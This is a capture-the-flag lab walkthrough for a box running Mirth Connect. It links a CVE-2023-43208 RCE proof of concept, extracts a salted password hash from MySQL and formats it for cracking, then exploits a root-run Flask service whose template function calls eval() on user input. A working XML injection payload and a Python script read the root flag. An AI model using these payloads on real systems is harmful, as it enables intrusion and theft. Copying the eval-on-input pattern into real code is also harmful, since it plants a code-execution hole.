


# Initial access and CVE-2023-43208 


I found this helpful poc
https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc


# Lateral movements

after get the credentials from mirth.propterties i logiened into MySQL and get the encrypted password in PERSON_PASSWORD table

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

after research i realized that is not pure hash its 

i see this link

https://github.com/nextgenhealthcare/connect/issues/5665

base64(salt[8 bytes]+hash)

now lets extract each one the hash and password and put the both in a hashcat format

first lets decode the base64 encoding and then convert it to bytes 

```
echo -n 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p
```


it produce to us this

```
bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d427b8ad76b55603f90b32ddf0fb
```

lets extract the salt as we see from the bug we saw it stores at the begging the salt and its size is 8 bytes 

the salt is 8 bytes so lets get the first 16 bit

which is
```
bbff8b0413949da7
```


now lets extract the hash
```
62c8506c30ea080cf2db511d2b939f641243d427b8ad76b55603f90b32ddf0fb
```


lets put it together in crack able format that can john read it
```
62c8506c30ea080cf2db511d2b939f641243d427b8ad76b55603f90b32ddf0fb$bbff8b0413949da7
```



lets try to login with this data and boom we logined and got user.txt


# PrivESC

i first see the sudo premtions

```bash
sudo -l
```

no thing


then i tired to search for setuid binareis

```bash
find / -perm u=s 2>/dev/null
```

and no thing interseted


so lets see background procseess

```bash
ps -aux
```


and the one interesting and the strangest thing is this


```bash
root        3535  0.0  0.7  39872 31156 ?        Ss   11:28   0:02 /usr/bin/python3 /usr/local/bin/notif.py
```

this python script and running with root

lets see what  does this script do

lets analyze the code

```python
#!/usr/bin/env python3

"""

Notification server for added patients.

This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.

It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.

It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.

"""

from flask import Flask, request, abort

import re

import uuid

from datetime import datetime

import xml.etree.ElementTree as ET, os

  

app = Flask(__name__)

USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

  

def template(first, last, sender, ts, dob, gender):

pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")

for s in [first, last, sender, ts, dob, gender]:

if not pattern.fullmatch(s):

return "[INVALID_INPUT]"

# DOB format is DD/MM/YYYY

try:

year_of_birth = int(dob.split('/')[-1])

if year_of_birth < 1900 or year_of_birth > datetime.now().year:

return "[INVALID_DOB]"

except:

return "[INVALID_DOB]"

template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"

try:

return eval(f"f'''{template}'''")

except Exception as e:

return f"[EVAL_ERROR] {e}"

  

@app.route("/addPatient", methods=["POST"])

def receive():

if request.remote_addr != "127.0.0.1":

abort(403)

try:

xml_text = request.data.decode()

xml_root = ET.fromstring(xml_text)

except ET.ParseError:

return "XML ERROR\n", 400

patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")

if patient is None:

return "No <patient> tag found\n", 400

id = uuid.uuid4().hex

data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}

notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])

path = os.path.join(USER_DIR,f"{id}.txt")

with open(path,"w") as f:

f.write(notification+"\n")

return notification

  

if __name__=="__main__":

app.run("127.0.0.1",54321, threaded=True)
```


ok first the server listen for xmltags and then it right it

 from the notification variable we can realize this this is the tags it listen for

```xml
<patient>
    <firstname></firstname>
    <lastname>test</lastname>
    <sender_app>Mirth</sender_app>
    <timestamp>2023</timestamp>
    <birth_date>1/1/2023</birth_date>
    <gender>M</gender>
</patient>
```

lets see what the template function does

it first make a regex to search in each tag if it doesn't match it will cancel
so simply  we have the string we invoke to any tag is be one of this
`^[a-zA-Z0-9._'\"(){}=+/]+$`
the <birth_date> must the year be greater than 1900 and lower than current year 2026


# RCE from eval() function via Template injection

if you bypassed all this it will make a variable called template
then returns  it in the eval function and the regex pattern doesn't ignore curly brackets we can invoke python code so easily in the formatted string

the eval function runs any python code you insert to it 
 we can simple make template injection in the XML payload

```xml
<patient>
    <firstname>{open('/root/root.txt').read()}</firstname>
    <lastname>test</lastname>
    <sender_app>Mirth</sender_app>
    <timestamp>2023</timestamp>
    <birth_date>1/1/2023</birth_date>
    <gender>M</gender>
</patient>
```


curl is not installed in the box lets use requests library

```python
import requests

  

url = "http://127.0.0.1:54321/addPatient"

request ="""
<patient>
    <firstname>{open('/root/root.txt').read()}</firstname>
    <lastname>test</lastname>
    <sender_app>Mirth</sender_app>
    <timestamp>2023</timestamp>
    <birth_date>1/1/2023</birth_date>
    <gender>M</gender>
</patient>
"""

post = requests.post(url,data = request,allow_redirects=False)
print(post.text)
```


and boom we got root.txt :)